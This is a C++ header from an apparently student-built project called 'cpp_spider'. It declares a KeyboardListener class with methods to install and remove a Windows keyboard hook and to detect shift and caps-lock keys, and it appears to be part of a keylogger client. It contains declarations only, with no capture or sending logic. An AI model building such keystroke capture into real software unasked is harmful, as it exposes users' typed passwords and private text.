/*
** KeyboardListener.hpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/KeyboardListener.hpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:14:11 2017 Gauthier Cler
** Last update Sun Oct 08 22:14:13 2017 Gauthier Cler
*/

#ifndef CPP_SPIDER_KEYBOARDLISTENER_HPP
#define CPP_SPIDER_KEYBOARDLISTENER_HPP

#include <fstream>
#include "IListener.hpp"

namespace Client {

	class KeyboardListener : public IListener {

	public:

		KeyboardListener();

		~KeyboardListener();

		virtual void createHook(HINSTANCE const &moduleHandle);

		virtual void removeHook();

		static bool isMaj(std::string key);

		static bool isCaps(std::string key);
	};
}

#endif //CPP_SPIDER_KEYBOARDLISTENER_HPP